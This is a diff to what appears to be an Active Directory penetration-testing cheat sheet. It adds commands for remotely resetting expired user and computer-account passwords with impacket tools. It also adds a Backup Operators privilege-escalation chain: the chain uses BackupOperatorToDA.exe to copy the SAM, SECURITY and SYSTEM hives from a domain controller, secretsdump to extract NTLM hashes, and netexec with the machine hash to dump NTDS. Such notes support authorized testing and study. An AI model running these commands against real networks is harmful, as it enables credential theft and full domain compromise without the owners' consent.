@@ -144,6 +144,46 @@ sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
 
+## Resetting password
+
+### User
+
+> STATUS_PASSWORD_MUST_CHANGE
+
+1. Outlook web app
+2. RDP
+3. smbpasswd (easy)
+4. ldap
+
+```bash
+impacket-smbpasswd domain.com/user:pass@dc.domain.com -newpass NewPass2024
+```
+
+### Computer
+
+1. The NetUserChangePassword protocol
+2. The NetUserSetInfo protocol
+3. The Kerberos change-password protocol (IETF Internet Draft Draft-ietf-cat-kerb-chg-password-02.txt) - port 464
+4. Kerberos set-password protocol (IETF Internet Draft Draft-ietf-cat-kerberos-set-passwd-00.txt) - port 464
+5. Lightweight Directory Access Protocol (LDAP) write-password attribute (if 128-bit Secure Sockets Layer (SSL) is used)
+6. XACT-SMB for pre-Microsoft Windows NT (LAN Manager) compatibility
+
+```bash
+changepasswd.py domain.com/'computer01$':'pass'@domain.com -newpass password -protocol kpasswd -dc-ip <DC IP>
+```
+
+## Privileged Groups
+
+### Backup Operators
+
+```powershell
+# Obtener SAM SECURITY y SYSTEM files
+.\BackupOperatorToDA.exe -u 'user' -p 'pass' -d domain.com -t \\dc01.domain.com -o C:\
+# Descifrar y obtener hashes NTLM
+impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
+# Guardamos el hash de $MACHINE.ACC y hacemos Dump de NTDS
+netexec smb 10.10.121.167 -u 'dc01$' -H <hash here> --ntds
+```
 
 
 ### References
@@ -153,3 +193,4 @@ sc.exe \\dc01 start dns
 - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
 - https://www.thehacker.recipes/a-d/recon
 - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
+- https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/
